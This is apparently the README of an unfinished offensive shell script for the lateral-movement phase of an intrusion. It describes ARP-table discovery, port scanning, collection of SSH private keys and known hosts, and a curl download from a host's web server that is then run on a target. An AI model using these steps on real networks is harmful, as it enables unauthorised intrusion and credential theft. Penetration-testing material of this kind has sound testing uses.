# Lateral Movement Phase

Definition...  

Available parts:
- Get network neighbours (from arp table)
- Get reachable IP addresses
- Port scan of a given IP address
- Get SSH information about private keys and known hosts

## Usage

From github:
```sh
curl -LJO ...
sh 
```
Local network:
```sh
# Host
sh lateral-movement.sh -w
# Target
curl -LJO <Host>:8000/
sh lateral-movement.sh
```

### Parameters

```sh
sh lateral-movement.sh -h

Usage: lateral-movement.sh [options]

Options:
-h               Show this help message
-p <IP address>  Do a port scan of the given IP address
-w               Serves an local web server for transferring files

Output:
-c               No colours. Without colours, the output can probably be read better
-q               Quiet. No banner and no advisory displayed
```

## Results

Results saved to files in current directory and printed to stdout.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems.

-----

## Additional Information

### Pivoting with Proxychains

Todo...

Pivoting: 
proxychains

and so on...


